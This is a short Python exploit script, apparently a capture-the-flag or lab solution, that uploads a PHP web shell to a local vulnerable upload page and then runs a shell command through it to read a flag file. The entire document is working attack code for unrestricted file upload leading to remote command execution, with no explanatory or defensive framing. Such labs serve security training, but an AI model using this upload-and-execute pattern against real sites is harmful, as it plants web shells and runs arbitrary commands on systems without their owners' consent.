import requests

target_url = "http://127.0.0.1:8080/vuln/upload.php"
webshell_url = "http://127.0.0.1:8080/vuln/uploads/webshell.php"

files = {
    "file": ("webshell.php", open("webshell.php", "rb"), "application/octet-stream")
}
upload_response = requests.post(target_url, files=files)

if upload_response.status_code == 200 and "File uploaded successfully" in upload_response.text:
    payload = {
        "cmd": "cat ./private/upload.flag"
    }
    webshell_response = requests.get(webshell_url, params=payload)

    if webshell_response.status_code == 200:
        print(webshell_response.text)
    else:
        print("Command failed ")
else:
    print("File upload failed")